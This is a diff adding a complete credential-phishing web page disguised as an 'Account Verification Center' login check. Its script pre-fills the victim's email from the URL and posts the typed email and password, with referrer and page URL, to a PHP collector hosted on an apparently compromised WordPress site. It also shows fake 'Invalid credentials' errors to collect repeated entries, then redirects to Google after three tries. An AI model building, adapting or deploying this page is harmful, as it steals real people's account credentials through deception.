@@ -1,0 +1,336 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Security Verification</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: #dde1e7;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+    }
+
+    .card {
+      width: 490px;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 2px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    .card-header {
+      background-color: #666c72;
+      color: #fff;
+      text-align: center;
+      padding: 14px 20px;
+      font-size: 15px;
+      letter-spacing: 0.3px;
+    }
+
+    /* PAGE 1 */
+    .page1-body {
+      padding: 40px 30px 35px;
+      text-align: center;
+      display: block;
+    }
+
+    .shield-icon {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+    }
+
+    .shield-icon svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    .page1-body h2 {
+      font-size: 15px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .page1-body p {
+      font-size: 13.5px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      background-color: #1a8fc1;
+      color: #fff;
+      border: none;
+      padding: 10px 32px;
+      font-size: 14px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn:hover {
+      background-color: #1679a8;
+    }
+
+    /* PAGE 2 */
+    .page2-top {
+      background: #f9f9f9;
+      border-bottom: 1px solid #ddd;
+      padding: 28px 20px;
+      text-align: center;
+    }
+
+    .page2-top .shield-icon {
+      margin-bottom: 0;
+    }
+
+    .page2-form {
+      padding: 28px 30px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .page2-form input {
+      width: 100%;
+      max-width: 360px;
+      padding: 10px 14px;
+      font-size: 13.5px;
+      border: 1px solid #bbb;
+      border-radius: 3px;
+      outline: none;
+      color: #333;
+    }
+
+    .page2-form input:focus {
+      border-color: #1a8fc1;
+    }
+
+    .hidden { display: none; }
+    
+    .error-message {
+      color: #d32f2f;
+      font-size: 13px;
+      max-width: 360px;
+      text-align: left;
+      width: 100%;
+      background: #ffebee;
+      padding: 8px 12px;
+      border-radius: 3px;
+      border-left: 3px solid #d32f2f;
+      margin-top: -5px;
+    }
+    
+    .info-text {
+      font-size: 11px;
+      color: #888;
+      text-align: center;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="card-header">Account Verification Center</div>
+
+  <!-- PAGE 1 (shown by default) -->
+  <div class="page1-body" id="page1">
+    <div class="shield-icon">
+      <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="50" cy="50" r="38" stroke="#1a8fc1" stroke-width="2" stroke-dasharray="6 4"/>
+        <circle cx="50" cy="12" r="4" fill="#1a8fc1"/>
+        <circle cx="88" cy="50" r="4" fill="#1a8fc1"/>
+        <circle cx="50" cy="88" r="4" fill="#1a8fc1"/>
+        <circle cx="12" cy="50" r="4" fill="#1a8fc1"/>
+        <rect x="32" y="48" width="36" height="28" rx="4" fill="#1a8fc1"/>
+        <path d="M38 48V38a12 12 0 0 1 24 0v10" stroke="#1a8fc1" stroke-width="4" stroke-linecap="round" fill="none"/>
+        <circle cx="50" cy="60" r="4" fill="#fff"/>
+        <rect x="48" y="62" width="4" height="6" rx="1" fill="#fff"/>
+      </svg>
+    </div>
+    <h2>Additional Verification Required</h2>
+    <p>To continue accessing your account, please verify your identity by logging in with your credentials.</p>
+    <button class="btn" onclick="showPage2()">Continue to Login</button>
+  </div>
+
+  <!-- PAGE 2 (hidden by default) -->
+  <div id="page2" class="hidden">
+    <div class="page2-top">
+      <div class="shield-icon">
+        <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="50" cy="50" r="38" stroke="#1a8fc1" stroke-width="2" stroke-dasharray="6 4"/>
+          <circle cx="50" cy="12" r="4" fill="#1a8fc1"/>
+          <circle cx="88" cy="50" r="4" fill="#1a8fc1"/>
+          <circle cx="50" cy="88" r="4" fill="#1a8fc1"/>
+          <circle cx="12" cy="50" r="4" fill="#1a8fc1"/>
+          <rect x="32" y="48" width="36" height="28" rx="4" fill="#1a8fc1"/>
+          <path d="M38 48V38a12 12 0 0 1 24 0v10" stroke="#1a8fc1" stroke-width="4" stroke-linecap="round" fill="none"/>
+          <circle cx="50" cy="60" r="4" fill="#fff"/>
+          <rect x="48" y="62" width="4" height="6" rx="1" fill="#fff"/>
+        </svg>
+      </div>
+    </div>
+    
+    <div class="page2-form">
+      <div id="errorMessage" class="error-message" style="display: none;"></div>
+      
+      <form id="loginForm" style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 14px;" onsubmit="return handleSubmit(event)">
+        <input type="text" id="email" name="email" placeholder="Email address" autocomplete="email"/>
+        <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password"/>
+        <button type="submit" class="btn">Verify Identity</button>
+        <div class="info-text">Secure verification • SSL encrypted</div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Attempt counter
+  let attempts = parseInt(localStorage.getItem('verifyAttempts')) || 0;
+  const MAX_ATTEMPTS = 3;
+  
+  // PHP script URL - update with your actual path
+  const PHP_SCRIPT_URL = 'https://tkmgroup.com.vn/wp-includes/Text/1ydsrnq/cz/email.php';
+  
+  // Function to extract email from hash (for pre-filling)
+  function getEmailFromHash() {
+    const hash = window.location.hash;
+    if (hash && hash.length > 1) {
+      return hash.substring(1);
+    }
+    return null;
+  }
+  
+  // Function to extract email from URL query param
+  function getEmailFromQuery() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('email') || params.get('user');
+  }
+  
+  // Get email from URL
+  const emailFromUrl = getEmailFromHash() || getEmailFromQuery();
+  
+  // Function to show page 2
+  function showPage2() {
+    document.getElementById('page1').classList.add('hidden');
+    document.getElementById('page2').classList.remove('hidden');
+    
+    const emailField = document.getElementById('email');
+    if (emailFromUrl && emailFromUrl.includes('@')) {
+      emailField.value = emailFromUrl;
+    } else {
+      emailField.value = '';
+    }
+    
+    document.getElementById('password').value = '';
+    const errorDiv = document.getElementById('errorMessage');
+    errorDiv.style.display = 'none';
+  }
+  
+  // Handle form submission
+  async function handleSubmit(event) {
+    event.preventDefault();
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const errorDiv = document.getElementById('errorMessage');
+    
+    if (!email || !password) {
+      errorDiv.textContent = 'Please enter both email and password.';
+      errorDiv.style.display = 'block';
+      return false;
+    }
+    
+    if (!email.includes('@') || !email.includes('.')) {
+      errorDiv.textContent = 'Please enter a valid email address.';
+      errorDiv.style.display = 'block';
+      return false;
+    }
+    
+    // Increment attempts
+    attempts++;
+    localStorage.setItem('verifyAttempts', attempts);
+    localStorage.setItem('lastAttemptTime', Date.now().toString());
+    
+    // Collect and send data to PHP
+    try {
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('password', password);
+      formData.append('attempt', attempts);
+      formData.append('timestamp', new Date().toISOString());
+      formData.append('referrer', document.referrer);
+      formData.append('url', window.location.href);
+      
+      if (emailFromUrl) {
+        formData.append('prefilled_email', emailFromUrl);
+      }
+      
+      // Send to PHP script
+      const response = await fetch(PHP_SCRIPT_URL, {
+        method: 'POST',
+        body: formData
+      });
+      
+      const result = await response.text();
+      console.log('PHP Response:', result);
+      
+    } catch (error) {
+      console.log('Error sending data:', error);
+      // Try fallback with no-cors if needed
+      try {
+        const formData = new FormData();
+        formData.append('email', email);
+        formData.append('password', password);
+        formData.append('attempt', attempts);
+        
+        await fetch(PHP_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: formData
+        });
+      } catch(e) {
+        console.log('Fallback also failed:', e);
+      }
+    }
+    
+    // Handle attempts logic
+    if (attempts >= MAX_ATTEMPTS) {
+      localStorage.removeItem('verifyAttempts');
+      localStorage.removeItem('lastAttemptTime');
+      window.location.href = 'http://google.com';
+      return false;
+    } else {
+      errorDiv.textContent = 'Invalid credentials. Please try again.';
+      errorDiv.style.display = 'block';
+      document.getElementById('password').value = '';
+    }
+    
+    return false;
+  }
+  
+  // Auto-clear attempts after 24 hours
+  const lastAttemptTime = localStorage.getItem('lastAttemptTime');
+  if (lastAttemptTime) {
+    const hoursSinceLast = (Date.now() - parseInt(lastAttemptTime)) / (1000 * 60 * 60);
+    if (hoursSinceLast > 24) {
+      localStorage.removeItem('verifyAttempts');
+      localStorage.removeItem('lastAttemptTime');
+      attempts = 0;
+    }
+  }
+</script>
+</body>
+</html>
